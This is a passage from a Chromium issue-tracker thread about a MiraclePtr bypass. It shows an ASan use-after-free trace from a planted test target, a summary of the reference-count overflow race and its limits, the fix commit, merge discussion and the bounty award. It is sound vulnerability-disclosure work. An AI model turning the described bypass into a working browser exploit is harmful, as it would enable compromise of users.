    #28 0x5625f7d204a2 in content::BrowserMainLoop::RunMainMessageLoop() content/browser/browser_main_loop.cc:1102:18
    #29 0x5625f7d27b7c in content::BrowserMainRunnerImpl::Run() content/browser/browser_main_runner_impl.cc:159:15
    #30 0x5625f7d16fe8 in content::BrowserMain(content::MainFunctionParams) content/browser/browser_main.cc:34:28
    #31 0x5625fde38360 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:717:10
    #32 0x5625fde3beff in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool) content/app/content_main_runner_impl.cc:1309:10
    #33 0x5625fde3b5b5 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1154:12
    #34 0x5625fde357b0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:332:36
    #35 0x5625fde35e3b in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:345:10
    #36 0x5625ee3da408 in ChromeMain chrome/app/chrome_main.cc:192:12
    #37 0x7fce042456c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

0x521000677100 is located 0 bytes inside of 4104-byte region [0x521000677100,0x521000678108)
freed by thread T0 (chrome) here:
    #0 0x5625ee3d848d in operator delete(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:143:3
    #1 0x5625f8944ee5 in content::PermissionServiceImpl::TestBackupRefPtr(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) content/browser/permissions/permission_service_impl.cc:235:32
    #2 0x5625f2e1cb9b in blink::mojom::PermissionServiceStubDispatch::Accept(blink::mojom::PermissionService*, mojo::Message*) gen/third_party/blink/public/mojom/permissions/permission.mojom.cc:2301:13
    #3 0x562601e6aa97 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:54
    #4 0x562601e8691d in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #5 0x562601e6fc65 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:721:20
    #6 0x562601e945fc in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1120:42
    #7 0x562601e92374 in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:733:7
    #8 0x562601e86a1a in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #9 0x562601e62113 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:554:49
    #10 0x562601e63b50 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:611:14
    #11 0x562601e6456d in Invoke<void (mojo::Connector::*)(), const base::WeakPtr<mojo::Connector> &> base/functional/bind_internal.h:738:12
    #12 0x562601e6456d in MakeItSo<void (mojo::Connector::*)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector> > > base/functional/bind_internal.h:954:5
    #13 0x562601e6456d in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*&&)(), base::WeakPtr<mojo::Connector>&&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector>>, void ()>::RunImpl<void (mojo::Connector::*)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>, 0ul>(void (mojo::Connector::*&&)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/bind_internal.h:1067:14
    #14 0x562600776644 in Run base/functional/callback.h:156:12
    #15 0x562600776644 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:203:34
    #16 0x5626007d9a36 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:11)> base/task/common/task_annotator.h:90:5
    #17 0x5626007d9a36 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #18 0x5626007d894d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #19 0x5626007da77a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #20 0x562600940d89 in base::MessagePumpGlib::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_glib.cc:694:48
    #21 0x5626007db3e6 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:645:12
    #22 0x562600708f5f in base::RunLoop::Run(base::Location const&) base/run_loop.cc:134:14
    #23 0x5625f7d204a2 in content::BrowserMainLoop::RunMainMessageLoop() content/browser/browser_main_loop.cc:1102:18
    #24 0x5625f7d27b7c in content::BrowserMainRunnerImpl::Run() content/browser/browser_main_runner_impl.cc:159:15
    #25 0x5625f7d16fe8 in content::BrowserMain(content::MainFunctionParams) content/browser/browser_main.cc:34:28
    #26 0x5625fde38360 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:717:10
    #27 0x5625fde3beff in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool) content/app/content_main_runner_impl.cc:1309:10
    #28 0x5625fde3b5b5 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1154:12
    #29 0x5625fde357b0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:332:36
    #30 0x5625fde35e3b in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:345:10
    #31 0x5625ee3da408 in ChromeMain chrome/app/chrome_main.cc:192:12
    #32 0x7fce042456c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

previously allocated by thread T0 (chrome) here:
    #0 0x5625ee3d7c2d in operator new(unsigned long) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:86:3
    #1 0x5625f894dbe9 in make_unique<UafTarget> third_party/libc++/src/include/__memory/unique_ptr.h:620:26
    #2 0x5625f894dbe9 in UafManager::NewObject() content/browser/permissions/uaf111.cc:20:29
    #3 0x5625f8944e0c in content::PermissionServiceImpl::TestBackupRefPtr(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) content/browser/permissions/permission_service_impl.cc:232:32
    #4 0x5625f2e1cb9b in blink::mojom::PermissionServiceStubDispatch::Accept(blink::mojom::PermissionService*, mojo::Message*) gen/third_party/blink/public/mojom/permissions/permission.mojom.cc:2301:13
    #5 0x562601e6aa97 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1036:54
    #6 0x562601e8691d in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #7 0x562601e6fc65 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:721:20
    #8 0x562601e945fc in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1120:42
    #9 0x562601e92374 in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:733:7
    #10 0x562601e86a1a in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #11 0x562601e62113 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:554:49
    #12 0x562601e63b50 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:611:14
    #13 0x562601e63579 in OnHandleReadyInternal mojo/public/cpp/bindings/lib/connector.cc:444:3
    #14 0x562601e63579 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:410:3
    #15 0x562601e64e7a in Invoke<void (mojo::Connector::*)(const char *, unsigned int), mojo::Connector *, const char *, unsigned int> base/functional/bind_internal.h:738:12
    #16 0x562601e64e7a in MakeItSo<void (mojo::Connector::*const &)(const char *, unsigned int), const std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<const char, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, unsigned int> base/functional/bind_internal.h:930:12
    #17 0x562601e64e7a in RunImpl<void (mojo::Connector::*const &)(const char *, unsigned int), const std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<const char, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, 0UL, 1UL> base/functional/bind_internal.h:1067:14
    #18 0x562601e64e7a in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:987:12
    #19 0x5625f309a263 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:344:12
    #20 0x5625f3099fef in Invoke<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &), const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &> base/functional/bind_internal.h:671:12
    #21 0x5625f3099fef in MakeItSo<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &), const std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)> > &, unsigned int, const mojo::HandleSignalsState &> base/functional/bind_internal.h:930:12
    #22 0x5625f3099fef in RunImpl<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &), const std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)> > &, 0UL> base/functional/bind_internal.h:1067:14
    #23 0x5625f3099fef in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:987:12
    #24 0x562601eed54b in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & base/functional/callback.h:344:12
    #25 0x562601eece73 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:278:14
    #26 0x562601eee0b4 in Invoke<void (mojo::SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &), const base::WeakPtr<mojo::SimpleWatcher> &, int, unsigned int, mojo::HandleSignalsState> base/functional/bind_internal.h:738:12
    #27 0x562601eee0b4 in MakeItSo<void (mojo::SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState> > base/functional/bind_internal.h:954:5
    #28 0x562601eee0b4 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>) base/functional/bind_internal.h:1067:14
    #29 0x562600776644 in Run base/functional/callback.h:156:12
    #30 0x562600776644 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:203:34
    #31 0x5626007d9a36 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:11)> base/task/common/task_annotator.h:90:5
    #32 0x5626007d9a36 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #33 0x5626007d894d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #34 0x5626007da77a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #35 0x562600940452 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:649:46
    #36 0x562600943318 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:274:43
    #37 0x7fce0586c1f3  (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x571f3) (BuildId: 53ec298e2881f5aca10690982d7e07681d55bfce)

SUMMARY: AddressSanitizer: heap-use-after-free base/memory/raw_ptr_asan_hooks.cc:53:17 in base::internal::(anonymous namespace)::CrashImmediatelyOnUseAfterFree(unsigned long)
Shadow bytes around the buggy address:
  0x521000676e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000676f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000676f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000677000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000677080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x521000677100:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x521000677180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x521000677200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x521000677280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x521000677300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x521000677380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==4115873==ADDITIONAL INFO

==4115873==Note: Please include this section with the ASan report.
Task trace:
    #0 0x562601e64137 in PostDispatchNextMessageFromPipe mojo/public/cpp/bindings/lib/connector.cc:574:7
    #1 0x562601e64137 in PostDispatchNextMessageFromPipe mojo/public/cpp/bindings/lib/connector.cc:574:7
    #2 0x562601e64137 in PostDispatchNextMessageFromPipe mojo/public/cpp/bindings/lib/connector.cc:574:7
    #3 0x562601e64137 in PostDispatchNextMessageFromPipe mojo/public/cpp/bindings/lib/connector.cc:574:7


MiraclePtr Status: PROTECTED
This crash occurred while a raw_ptr<T> object containing a dangling pointer was being dereferenced.
MiraclePtr is expected to make this crash non-exploitable once fully enabled.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==4115873==END OF ADDITIONAL INFO
==4115873==ABORTING


```

I haven't dug into this in `gdb` or `lldb` because from [#comment8](https://issues.chromium.org/issues/340122160#comment8), it sounds like bartekn@ already has a good idea of what's going on here. I assume that reproducing this ASAN crash is enough to enable Bartek to dig into this further, so assigning thataway.

### ad...@google.com (2024-05-14)

Setting FoundIn-124 on the assumption that this has been exploitable since the beginning of MiraclePtr, and isn't a new bug.

### gl...@google.com (2024-05-14)

Thanks for the report! I believe it's a valid issue, and is definitely worth fixing.

We do not have the same problem in [`RefCountedThreadSafeBase`](https://source.chromium.org/chromium/chromium/src/+/main:base/memory/ref_counted.h;drc=5bf1a4a403490afa7294232e383a1750aefcc881;l=214) because there the reference count is a signed integer, so we instead of wrapping around to zero, it wraps around to `-INT_MAX`. We should do the same in `InSlotMetadata` and reserve the most significant bit in the reference count so that it acts as a safe gap.

For transparency, the bypass has several limitations:

- It requires to ability to control `raw_ptr`s to a vulnerable object from multiple threads and create an arbitrary number of `raw_ptr`s in at least one of them. This makes the proportion of UAF bugs for which this bypass is applicable quite small.
- It is racy, and since in the real-world scenario the exploit will also need to run shell code that will freeze the thread that's about to crash, the race will be harder to win.
- Overflowing the `2**29` reference count takes a non-trivial amount of time and RAM.

That said, there are likely real UAFs where these conditions can be met on some platforms.

### pe...@google.com (2024-05-14)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-05-14)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ap...@google.com (2024-05-16)

Project: chromium/src
Branch: main

commit e77b67df17a9a7cd7c09d4b134a660ad7273f640
Author: Sergei Glazunov <glazunov@google.com>
Date:   Thu May 16 04:53:23 2024

    [MiraclePtr] Harden the reference count overflow check
    
    Reserves the most significant bit of the reference count to prevent
    races with overflow detection.
    
    Bug: 340122160
    Change-Id: I20740d384c16d04db2a0e9c8f65100f6aa4e1f5c
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5538010
    Auto-Submit: Sergei Glazunov <glazunov@google.com>
    Commit-Queue: Bartek Nowierski <bartekn@chromium.org>
    Reviewed-by: Bartek Nowierski <bartekn@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1301756}

M       base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h

https://chromium-review.googlesource.com/5538010


### ha...@gmail.com (2024-05-16)

Thanks for the fix, learned a lot from reviewing the code of miracleptr!

### pe...@google.com (2024-05-16)

Requesting merge to extended stable (M124) because latest trunk commit (1301756) appears to be after extended stable branch point (1274542).
Requesting merge to stable (M125) because latest trunk commit (1301756) appears to be after stable branch point (1287751).
Requesting merge to dev (M126) because latest trunk commit (1301756) appears to be after dev branch point (1300313).
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### pe...@google.com (2024-05-17)

Merge approved: your change passed merge requirements and is auto-approved for M126. Please go ahead and merge the CL to branch 6478 (refs/branch-heads/6478) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: harrysouders (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

### pe...@google.com (2024-05-17)

Merge review required: M125 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

### pe...@google.com (2024-05-17)

Merge review required: M124 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), obenedict (ChromeOS), danielyip (Desktop)

### gl...@google.com (2024-05-17)

> 1. Why does your merge fit within the merge criteria for these milestones?

It fixes a medium-severity security issue.

> 2. What changes specifically would you like to merge? Please link to Gerrit.

<https://chromium-review.git.corp.google.com/c/chromium/src/+/5538010>

> 3. Have the changes been released and tested on canary?

Yes, released 12 hours ago.

> 4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

Not a new feature.

> 5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>

N/A

> 6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Manual verification is not possible.

### ap...@google.com (2024-05-17)

Project: chromium/src
Branch: refs/branch-heads/6478

commit 17313c294dff4a09a26c66c1b9683c55904a11bb
Author: Sergei Glazunov <glazunov@google.com>
Date:   Fri May 17 16:18:47 2024

    [MiraclePtr] Harden the reference count overflow check
    
    Reserves the most significant bit of the reference count to prevent
    races with overflow detection.
    
    (cherry picked from commit e77b67df17a9a7cd7c09d4b134a660ad7273f640)
    
    Bug: 340122160
    Change-Id: I20740d384c16d04db2a0e9c8f65100f6aa4e1f5c
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5538010
    Auto-Submit: Sergei Glazunov <glazunov@google.com>
    Commit-Queue: Bartek Nowierski <bartekn@chromium.org>
    Reviewed-by: Bartek Nowierski <bartekn@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1301756}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5545407
    Commit-Queue: Sergei Glazunov <glazunov@google.com>
    Cr-Commit-Position: refs/branch-heads/6478@{#155}
    Cr-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313}

M       base/allocator/partition_allocator/src/partition_alloc/in_slot_metadata.h

https://chromium-review.googlesource.com/5545407


### pe...@google.com (2024-05-17)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



### am...@chromium.org (2024-05-17)

Thanks for the investigation and fix, Sergei and also for answering the merge review questionnaire -- most appreciated!
M125 is already shipping to Stable, so as a mitigated, Medium severity issue going to decline this for backmerge to current Stable and Extended Stable, as this does not meet the criteria for backmerge.

### rz...@google.com (2024-05-21)

Adding to the LTS-NotApplicable-120 hotlist because the code changed by the fix doesn't exist in 120.

### pe...@google.com (2024-05-21)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



### sp...@google.com (2024-05-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $100115.00 for this report.

Rationale for this decision:
$100,115 MiraclePtr Bypass Reward (https://g.co/chrome/vrp#miracleptr-bypass-reward)!!!

Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. Two other things we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.
* If you are not already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have already registered, there is no need to repeat the process and you’ll automatically be paid soon. If you have any payment related questions or issues, please reach out to p2p-vrp@google.com.

### am...@chromium.org (2024-05-22)

Congratulations -- you are the first recipient of the MiraclePtr Bypass reward! It's been almost a year since we launched the reward in conjunction with enabling BRP across all platforms and yours is the first valid report of a bypass. While this is a somewhat mitigated bypass with some preconditions to exploit, this does impact a portion of BRP-protected UAFs so we did want to recognize that with the full bypass reward. Thank you so much for your amazing work and excellent write up of this issue!

If you would like to write a guest blog post about this bypass for the a Google security or Chromium Blog, we would very much encourage and support that, for publishing once this issue is disclosed. Please feel free to reach out to me directly ([amyressler@chromium.org](mailto:amyressler@chromium.org)) if you are interested.

Thanks again for this excellent report and work on this bypass and congratulations!!!

### ha...@gmail.com (2024-05-23)

Very thanks for the big reward! It's my honor to write a guest blog post for the chromium blog, I will finish it in a month. Cheers!

And please use credit: Micky    for this bug, Thanks!

### am...@chromium.org (2024-05-23)

🍻 Cheers to you, Micky! You deserve it and the big reward.
We're likewise very honored that you'd like to write a blog post on our blog.
Congratulations!!

### na...@google.com (2024-06-17)

Based on comment#25, not applicable fro LTS-120.

### pe...@google.com (2024-08-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> $100,115 MiraclePtr Bypass Reward (https://g.co/chrome/vrp#miracleptr-bypass-reward)!!!
> 
> Thank you for your efforts and helping us make Chrome more secure for all users!
> 
> Cheers,
> Chrome VRP Panel Bot
> 
> 
> P.S. Two other things we'd like to mention:
> 
> * Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by oth

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/340122160)*
